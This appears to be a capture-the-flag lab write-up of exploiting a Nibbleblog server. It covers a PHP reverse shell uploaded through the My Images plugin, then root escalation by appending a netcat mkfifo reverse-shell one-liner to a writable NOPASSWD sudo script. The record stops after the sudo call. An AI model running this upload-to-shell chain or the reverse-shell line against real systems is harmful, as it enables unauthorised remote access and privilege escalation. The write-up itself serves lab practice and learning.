Vulnerability Analysis
During the directory enumeration and manual analysis of the Nibbleblog instance, I stumbled upon an authenticated administrative panel endpoint:

```text
/nibbleblog/admin.php?controller=plugins&action=list
```
While reviewing the active extensions, the My Images plugin stood out because it allows users to upload files. This layout presents a classic vector for unrestricted file upload vulnerabilities, potentially leading to Remote Code Execution (RCE).

Exploitation & Foothold
To abuse this vector, I used the standard PHP reverse shell template located at /usr/share/webshells/php/php-reverse-shell.php. I edited the payload configuration by replacing the template variables with my local attacker machine's IP address and chosen listening port.

After uploading the modified PHP script via the "My Images" plugin interface, I spent some time mapping the backend structure to locate where uploaded files are permanently stored on the server. They are saved here:

```text
/nibbleblog/content/private/plugins/my_image/
```
With the path confirmed, I initialized a netcat listener on my machine and executed the uploaded PHP file by targeting it directly in the browser:


Privilege Escalation (Path to Root)

With a low-privileged foothold established as the `nibbler` user, the next objective is to identify local vulnerabilities or misconfigurations to escalate privileges to `root`. 

I initiated the local enumeration by checking the user's sudo privileges using `sudo -l`. The output revealed a critical configuration flaw:

```terminal
$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

The output indicates that the nibbler user can execute a specific shell script located at /home/nibbler/personal/stuff/monitor.sh with elevated root privileges without providing a password (NOPASSWD). Since this script resides within the user's home directory structure, we have full write permissions over it.

Instead of executing the original code, we can append a malicious reverse shell payload to the end of the monitor.sh script using the following command:

```terminal
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.70 3117 >/tmp/f" >> monitor.sh
```

Before execution, I ensured the script had proper execution permissions by running chmod +x monitor.sh. Next, I set up a secondary local netcat listener on port 3117 to catch the upcoming root connection.

Finally, I executed the script with elevated privileges using sudo:

```terminal
$ sudo /home/nibbler/personal/stuff/monitor.sh
'unknown': I need something more specific.
```
